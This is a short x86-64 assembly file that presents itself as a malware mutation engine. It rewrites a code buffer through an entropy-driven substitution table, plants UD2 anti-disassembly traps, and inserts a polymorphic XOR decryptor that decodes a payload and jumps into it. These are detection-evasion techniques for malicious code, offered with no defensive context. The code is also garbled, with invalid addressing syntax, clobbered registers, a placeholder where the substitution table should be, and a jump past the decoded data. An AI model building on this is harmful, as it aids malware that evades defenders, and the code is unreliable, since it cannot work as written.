section .text
global apply_mutation

apply_mutation:
    ; rdi=code, rsi=length, rdx=entropy_ptr
    push r12
    push r13
    push r14
    push r15
    
    mov r12, rdi        ; Code pointer
    mov r13, rsi        ; Length
    mov r14, rdx        ; Entropy
    mov r15, [r14]      ; Load entropy seed

    ; Entropy-driven mutation engine
    lea rcx, [r12 + r13 - 8]  ; Start from end
.mutate_loop:
    ; Reg mutation with entropy
    mov rax, [r14 + r15 % 32]  ; Entropy rotation
    xor r15, rax
    
    ; Random instruction substitution
    mov al, [r12 + rcx]
    mov bl, mutation_table(rax)
    mov [r12 + rcx], bl
    
    ; Insert anti-disassembly traps
    test r15b, 0b10000000
    jz .no_trap
    mov word [r12 + rcx], 0x0F0B  ; UD2 opcode
.no_trap:
    
    ; JIT metamorphic code generation
    call generate_jit_snippet
    
    dec rcx
    cmp rcx, r12
    jge .mutate_loop
    
    pop r15
    pop r14
    pop r13
    pop r12
    ret

generate_jit_snippet:
    ; Generate polymorphic decryptor
    rdseed rax
    and rax, 0xFFFF
    lea rdi, [r12 + rcx]  ; Insertion point
    
    ; ChaCha20 decryptor template
    mov rsi, decryptor_template
    mov rcx, decryptor_size
    rep movsb
    ret

section .rodata
mutation_table:  ; 256-byte instruction substitution matrix
    times 256 db 0x90  ; NOP base
    db 0x48, 0x89, 0xC0  ; MOV RAX,RAX
    ; ... (256 unique substitutions)

decryptor_template:
    mov rsi, payload_start
    mov rdi, rsi
    mov rcx, payload_size
    mov rdx, qword [entropy_store]
.decrypt_loop:
    lodsb
    xor al, dl
    rol dl, 3
    stosb
    loop .decrypt_loop
    jmp rdi
decryptor_size equ $ - decryptor_template
